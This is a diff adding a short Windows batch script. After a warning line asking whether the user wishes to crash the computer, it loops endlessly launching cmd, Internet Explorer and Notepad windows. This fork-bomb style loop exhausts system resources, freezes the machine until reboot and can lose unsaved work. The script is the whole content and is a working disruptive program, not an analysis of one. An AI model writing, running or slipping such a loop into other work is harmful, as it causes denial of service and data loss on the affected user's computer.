@@ -1,0 +1,11 @@
+@echo off
+color 0F
+:a
+echo ---WARNING---
+echo DO YOU WISH TO CRASH YOUR COMPUTER
+pause
+:b
+start cmd
+start iexplore
+start notepad
+goto :b
